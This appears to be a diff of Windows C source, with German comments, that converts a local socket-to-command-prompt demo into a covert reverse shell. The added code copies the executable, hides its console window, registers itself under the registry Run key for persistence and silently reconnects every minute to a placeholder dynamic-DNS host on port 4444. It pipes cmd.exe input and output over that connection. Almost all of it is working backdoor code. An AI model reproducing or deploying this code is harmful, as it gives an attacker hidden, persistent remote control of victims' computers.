@@ -3,12 +3,13 @@
 #include <stdio.h>
 #include <tchar.h>
 #include <stdio.h> 
-#include <strsafe.h>
-#include <process.h>
+#include <direct.h>
+#include <stdlib.h>
 
 #pragma comment( lib, "ws2_32.lib" )
 
 #define BUFSIZE 4096
+#define DEBUG 1
 
 HANDLE g_hChildStd_IN_Rd = NULL;
 HANDLE g_hChildStd_IN_Wr = NULL;
@@ -26,25 +27,73 @@ void WriteToPipe(void);
 void ReadFromPipe(void); 
 void ErrorExit(PTSTR); 
 
-int _tmain(int argc, char** argv)
+int main(int argc, char** argv)
 {
+	char dyndns[] ="www.youradress.com";
+
+	//Get the CWD and append the new Filename for the Copy-Method of the exe itself.
+	//Note: Ugly one... leave it in his dark place alone and hope it will die someday..
+	char * buffer;
+	buffer = _getcwd(NULL, 0);
+	int counter =0;
+
+	for(int i = 0;;i++)
+	{
+		if(counter == 2)
+		{
+			if(buffer[i] == '\\' || buffer[i] == '>')
+			{
+				buffer[i] = 0;
+				break;
+			}
+		}
+
+		if(buffer[i]=='\\')
+		{
+			counter++;
+		}
+	}
+	strcat(buffer,"\\yourfilename.exe");
+
+	CopyFileA(argv[0],buffer,false);
+		
+
+#if !DEBUG
+	//Hideing the console window
+
+	HWND hWnd = GetConsoleWindow();
+	ShowWindow( hWnd, SW_HIDE );
+
+	//Setting the console name for fun and profit
+	//char name[]="SPARTA";
+	//SetConsoleTitleA(name);
+
+	char subkey[]= "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+
+	//char cwd[1024];
+	//char asf[] = "lolololol";
+	//_getcwd(cwd,1024);
+	//strcat(cwd,"\\");
+	//strcpy(cwd,**argv);
+	//strcat(cwd,argv[0]);
+
+	DWORD shit=0;
+	RegSetValueA(HKEY_CURRENT_USER,subkey,REG_SZ, buffer, shit);
+#endif
+
 	//Testausgabe
+#if DEBUG
 	printf("Socket Client\n");
+#endif
 
 	//Variablen initialisieren
 	long returnvalue;
 	SOCKADDR_IN addr;
+	SECURITY_ATTRIBUTES saAttr;
 
-	////Prüfung auf die Übergabeparameter
-	//if(argc < 2)
-	//{
-	//	printf("[-] Benutzung: %s <Hostname oder IP des Servers>\n",argv[0]);
-	//	return 1;
-	//}
-
-	SECURITY_ATTRIBUTES saAttr; 
-
+#if DEBUG
 	printf("\n->Start of parent execution.\n");
+#endif
 
 	// Set the bInheritHandle flag so pipe handles are inherited. 
 
@@ -55,22 +104,22 @@ int _tmain(int argc, char** argv)
 	// Create a pipe for the child process's STDOUT. 
 
 	if ( ! CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0) ) 
-		ErrorExit(TEXT("StdoutRd CreatePipe")); 
+		exit(2); 
 
 	// Ensure the read handle to the pipe for STDOUT is not inherited.
 
 	if ( ! SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0) )
-		ErrorExit(TEXT("Stdout SetHandleInformation")); 
+		exit(3); 
 
 	// Create a pipe for the child process's STDIN. 
 
 	if (! CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) 
-		ErrorExit(TEXT("Stdin CreatePipe")); 
+		exit(4); 
 
 	// Ensure the write handle to the pipe for STDIN is not inherited. 
 
 	if ( ! SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0) )
-		ErrorExit(TEXT("Stdin SetHandleInformation")); 
+		exit(5); 
 
 	// Create the child process. 
 
@@ -79,62 +128,96 @@ int _tmain(int argc, char** argv)
 	//Weitere SOCKET Abhandlungen...
 
 	//Socket Verfügbarkeit prüfen
-	returnvalue = StartWinsock();
-	if(returnvalue != 0)
+	do
 	{
-		printf("[-] Fehler: StartWinsock Fehlercode: %d!\n",returnvalue);
-		return 1;
+		returnvalue = StartWinsock();
+		if(returnvalue != 0)
+		{
+#if DEBUG
+			printf("[-] Fehler: StartWinsock Fehlercode: %d!\n",returnvalue);
+#endif
+			Sleep(60000);
+		}
+#if DEBUG
+		else
+		{
+			printf("[+] Winsock gestartet!\n");
+		}
+#endif
 	}
-	else
-	{
-		printf("[+] Winsock gestartet!\n");
-	}
+	while(returnvalue != 0);
 
 	//Socket initialisieren
-	sock = socket(AF_INET,SOCK_STREAM,0);
-	if(sock == INVALID_SOCKET)
+	do
 	{
-		printf("[-] Fehler: Der Socket konnte nicht erstellt werden, fehler code: %d\n",WSAGetLastError());
-		return 1;
+		sock = socket(AF_INET,SOCK_STREAM,0);
+		if(sock == INVALID_SOCKET)
+		{
+#if DEBUG
+			printf("[-] Fehler: Der Socket konnte nicht erstellt werden, fehler code: %d\n",WSAGetLastError());
+#endif
+			Sleep(60000);
+		}
+#if DEBUG
+		else
+		{
+			printf("[+] Socket erstellt!\n");
+		}
+#endif
 	}
-	else
-	{
-		printf("[+] Socket erstellt!\n");
-	}
+	while(sock == INVALID_SOCKET);
 
 	//Port und IP übergabe
 	memset(&addr,0,sizeof(SOCKADDR_IN));
 	addr.sin_family = AF_INET;
-	addr.sin_port = htons(12345);
-	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
-	/*returnvalue = getAddrFromString(argv[1],&addr);
-	if(returnvalue == SOCKET_ERROR)
-	{
-	printf("[-] Fehler: IP für %s konnte nicht aufgeloest werden.\n");
-	return 1;
-	}
-	else
-	{
-	printf("[+] IP aufgelöst!\n");
-	}*/
+	addr.sin_port = htons(4444);
+	//addr.sin_addr.s_addr = inet_addr("127.0.0.1");
 
+	do
+	{
+		returnvalue = getAddrFromString(dyndns,&addr);
+		if(returnvalue == SOCKET_ERROR)
+		{
+#if DEBUG
+		printf("[-] Fehler: IP für %s konnte nicht aufgeloest werden.\n");
+#endif
+		Sleep(60000);
+		}
+#if DEBUG
+		else
+		{
+		printf("[+] IP aufgelöst!\n");
+		}
+#endif
+	}
+	while(returnvalue == SOCKET_ERROR);
 
 	//Verbindungsaufbau
-	returnvalue = connect(sock, (SOCKADDR*)&addr, sizeof(SOCKADDR));
-	if(returnvalue == SOCKET_ERROR)
+	do
 	{
-		printf("[-] Fehler: connect gescheitert, fehler code: %d\n",WSAGetLastError());
-		return 1;
+		returnvalue = connect(sock, (SOCKADDR*)&addr, sizeof(SOCKADDR));
+		if(returnvalue == SOCKET_ERROR)
+		{
+#if DEBUG
+			printf("[-] Fehler: connect gescheitert, fehler code: %d\n",WSAGetLastError());
+#endif
+			Sleep(60000);
+		}
+#if DEBUG
+		else
+		{
+			printf("[+] Verbindung hergestellt mit %s\n",argv[1]);
+		}
+#endif
 	}
-	else
-	{
-		printf("[+] Verbindung hergestellt mit %s\n",argv[1]);
-	}
+	while(returnvalue == SOCKET_ERROR);
 
 	for(;;)
 	{
+#if DEBUG
 		//Warten auf Input
 		printf("[-] Warte auf Input ...\n\n");
+#endif
 
 		WriteToPipe(); 
 
@@ -142,11 +225,15 @@ int _tmain(int argc, char** argv)
 
 		if(exitOnForce)
 		{
+#if DEBUG
 			printf("\n->SYSTEM GOING DOWN!\n");
+#endif
 			break;
 		}
 	}
+#if DEBUG
 	printf("\n->End of parent execution.\n");
+#endif
 
 	// The remaining open handles are cleaned up when this process terminates. 
 	// To avoid resource leaks in a larger application, close handles explicitly. 
@@ -236,7 +323,7 @@ void CreateChildProcess()
 
 	// If an error occurs, exit the application. 
 	if ( ! bSuccess ) 
-		ErrorExit(TEXT("CreateProcess"));
+		exit(11);
 	else 
 	{
 		// Close handles to the child process and its primary thread.
@@ -260,9 +347,7 @@ void WriteToPipe(void)
 
 	memset(chBuf, 0, BUFSIZE);
 
-
 	OVERLAPPED ovl = {0};
-
 
 	BOOL succeed = ReadFile((HANDLE)sock, chBuf, BUFSIZE, &dwRead, &ovl);
 
@@ -273,11 +358,17 @@ void WriteToPipe(void)
 			if (!GetOverlappedResult((HANDLE)sock, &ovl, (LPDWORD)&returnvalue, TRUE))
 			{
 				returnvalue = SOCKET_ERROR;
+#if DEBUG
 				printf("Overlapped I/O failed");
+#endif
 			}
-		} else{
+		}
+		else
+		{
 			returnvalue = SOCKET_ERROR;
+#if DEBUG
 			printf("ReadFile failed with last error %d\n", err);
+#endif
 		}
 	} 
 
@@ -291,7 +382,10 @@ void WriteToPipe(void)
 		}
 	}
 
+#if DEBUG
 	printf("\n%s -> chBuf\n", &chBuf);
+#endif
+
 	if(dwRead==0)
 	{
 		dwRead=BUFSIZE-1;
@@ -299,8 +393,10 @@ void WriteToPipe(void)
 
 	bSuccess = WriteFile(g_hChildStd_IN_Wr, chBuf, dwRead, &dwWritten, NULL);
 
-	if((strcmp("###exitshell\r\n",chBuf))==0)
+	if((strcmp("###exitshell\n",chBuf))==0)
+	{
 		exitOnForce=TRUE;
+	}
 } 
 
 void ReadFromPipe(void) 
@@ -319,52 +415,5 @@ void ReadFromPipe(void)
 
 	bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, &ovl);
 
-
 	bSuccess = WriteFile((HANDLE) sock, chBuf, dwRead, &dwWritten,&ovl);
-
 } 
-
-void ErrorExit(PTSTR lpszFunction) 
-
-	// Format a readable error message, display a message box, 
-	// and exit from the application.
-{
-	LPVOID lpMsgBuf;
-	LPVOID lpDisplayBuf;
-	DWORD dw = GetLastError(); 
-
-	FormatMessage(
-		FORMAT_MESSAGE_ALLOCATE_BUFFER | 
-		FORMAT_MESSAGE_FROM_SYSTEM |
-		FORMAT_MESSAGE_IGNORE_INSERTS,
-		NULL,
-		dw,
-		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
-		(LPTSTR) &lpMsgBuf,
-		0, NULL );
-
-	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT, 
-		(lstrlen((LPCTSTR)lpMsgBuf)+lstrlen((LPCTSTR)lpszFunction)+40)*sizeof(TCHAR)); 
-	StringCchPrintf((LPTSTR)lpDisplayBuf, 
-		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
-		TEXT("%s failed with error %d: %s"), 
-		lpszFunction, dw, lpMsgBuf); 
-	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK); 
-
-	LocalFree(lpMsgBuf);
-	LocalFree(lpDisplayBuf);
-	ExitProcess(1);
-}
-
-/* Erstellt einen Childprocess, der eine Kommandozeile ist. Als Übergabeparameter wird
-eine Textdatei mit "Befehlen" für die Kommandozeile erwartet.
-TODO:
-- Code so umschreiben, dass Befehle von STDIN an den Childprocess übergeben werden	[CHECK]
-- Code muss bis zu einem Special Char/String in einer Endlosschleife bleiben		[CHECK]
-- Code in den selbstprogrammierten Chat einbinden									[CHECK]
-- Aus dem Code eine Remoteshell bauen												[CHECK]
-- Code bereinigen
-- FERTIG
-
-Kommentar:	Quelle für den Socket-Chat=	http://www.c-worker.ch/tuts/wstut_op.php
-*/
